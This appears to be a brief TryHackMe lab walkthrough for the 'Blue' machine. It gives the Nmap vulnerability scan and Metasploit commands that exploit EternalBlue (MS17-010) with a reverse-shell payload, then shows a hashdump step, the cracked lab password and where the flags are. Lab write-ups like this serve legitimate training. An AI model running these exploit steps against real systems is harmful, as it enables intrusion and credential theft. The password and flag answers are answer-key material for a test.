# Blue Machine - TryHackMe Walkthrough

## Recon

### Nmap Scan

```bash
nmap -sV -vv --script vuln {machine_ip}
```

- Discovered open ports: 135, 139, 445, 3389, 49152, 49153, 49154, 49158, 49160.
- Identified services: MSRPC, netbios-ssn, Microsoft Windows 7-10 on port 445, and more.

## Initial Access

### Exploiting EternalBlue with Metasploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {machine_ip}
set payload windows/x64/shell/reverse_tcp
run
```

- Exploited MS17-010 vulnerability to gain access.

## Privilege Escalation

```bash
ps
```

- Default payload automatically escalated privileges; no additional steps required.

## Password Cracking

```bash
hashdump
```

- Cracked password: `alqfna22`

## Finding Flags

1. **Flag 1:** `C` directory.
2. **Flag 2:** `system32/config` directory.
3. **Flag 3:** Documents directory.

## Conclusion

This guide covers Nmap scanning, exploiting EternalBlue with Metasploit, privilege escalation, password cracking, and finding flags in different directories. Always use these techniques responsibly and ethically.
